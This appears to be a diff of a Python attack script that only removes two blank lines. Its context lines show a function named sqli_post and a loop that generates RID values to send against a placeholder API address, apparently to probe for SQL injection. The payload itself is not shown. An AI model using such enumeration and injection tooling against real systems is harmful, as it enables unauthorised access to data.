@@ -62,7 +62,6 @@ def sqli_post(rid):
  if "\\" in response.text:   
   print(colored("[+]"+response.text+"\r\nRID: "+r,"green"))
 
-
 for url in ['http://10.10.10.10/api/getSOMETHING']:
  try:
   for i in range(500,4000):
@@ -78,7 +77,6 @@ for url in ['http://10.10.10.10/api/getSOMETHING']:
    e = q[:2]
    r = w+e+"0"*(8-len(q))
    sqli_post(r)
-
 
  except HTTPError as http_err:
   print(f'HTTP error occurred: {http_err}')
